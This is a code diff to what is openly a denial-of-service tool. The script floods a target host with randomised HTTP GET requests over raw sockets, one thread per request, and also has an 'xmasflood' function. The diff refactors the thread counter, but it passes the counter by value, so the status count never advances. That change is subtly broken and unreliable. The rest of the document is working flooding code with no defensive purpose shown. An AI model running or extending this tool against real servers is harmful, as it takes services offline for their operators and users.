@@ -225,13 +225,14 @@ def xmasflood(target_url, targetPort, cycle):
 #
 # # Create a shared variable for thread counts
 # thread_num = 0
-thread_num_mutex = threading.Lock()
 
 
 def attack_http_flood(target, target_port, num_of_requests):
     host = target
     port = target_port
     num_requests = num_of_requests
+    thread_num_mutex = threading.Lock()
+    thread_num = 0
     try:
         ip = socket.gethostbyname(host)
     except socket.gaierror:
@@ -242,7 +243,7 @@ def attack_http_flood(target, target_port, num_of_requests):
     # Spawn a thread per request
     all_threads = []
     for i in range(num_requests):
-        t1 = threading.Thread(target=attack_http_flood_helper, args=(ip, port, host))
+        t1 = threading.Thread(target=attack_http_flood_helper, args=(ip, port, host, thread_num, thread_num_mutex))
         t1.start()
         all_threads.append(t1)
 
@@ -254,12 +255,11 @@ def attack_http_flood(target, target_port, num_of_requests):
 
 
 # Print thread status
-def print_status():
-    global thread_num
+def print_status(thread_num, thread_num_mutex):
     thread_num_mutex.acquire(True)
 
     thread_num += 1
-    #print the output on the sameline
+    # print the output on the sameline
     sys.stdout.write(f"\r {time.ctime().split()[3]} [{str(thread_num)}] #-#-# Hold Your Tears #-#-#")
     sys.stdout.flush()
     thread_num_mutex.release()
@@ -273,8 +273,8 @@ def generate_url_path():
 
 
 # Perform the request
-def attack_http_flood_helper(ip, port, host):
-    print_status()
+def attack_http_flood_helper(ip, port, host, thread_num, thread_mutex):
+    print_status(thread_num, thread_mutex)
     url_path = generate_url_path()
 
     # Create a raw socket
@@ -285,7 +285,7 @@ def attack_http_flood_helper(ip, port, host):
         dos.connect((ip, port))
 
         # Send the request according to HTTP spec
-        #old : dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
+        # old : dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
         byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
         dos.send(byt)
     except socket.error:
